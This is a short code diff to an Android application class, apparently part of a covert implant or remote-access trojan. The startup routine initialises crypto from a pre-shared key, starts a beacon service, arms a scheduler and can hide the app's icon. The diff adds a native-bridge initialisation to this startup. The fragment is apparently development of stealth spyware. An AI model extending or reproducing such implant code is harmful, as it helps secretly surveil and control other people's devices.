@@ -11,6 +11,7 @@ public class AgentApp extends Application {
         try {
             Config config = Config.get(this);
             Crypto.init(config.psk);
+            NativeBridge.init(this, config, Common.sid(this));
             BeaconService.start(this);
             Scheduler.arm(this);
             if (config.hideIcon) {
